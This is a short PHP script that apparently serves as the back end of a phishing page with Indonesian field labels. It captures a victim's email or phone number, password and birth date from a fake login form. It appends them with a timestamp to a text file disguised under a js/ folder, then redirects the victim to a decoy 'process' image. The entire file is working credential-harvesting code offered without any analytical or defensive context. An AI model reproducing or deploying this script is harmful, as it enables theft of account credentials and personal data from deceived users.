<?php
header ("Location: proses/process.gif");
$ADEx = "js/zxc.txt";
$ADEy = $_POST['username'];
$ADEz = $_POST['password'];
$ADE = $_POST['lahir'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle = fopen($ADEx, 'a');
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Lahir      : ");
fwrite($handle, "$ADE");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted     : ");
fwrite($handle, "$now");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
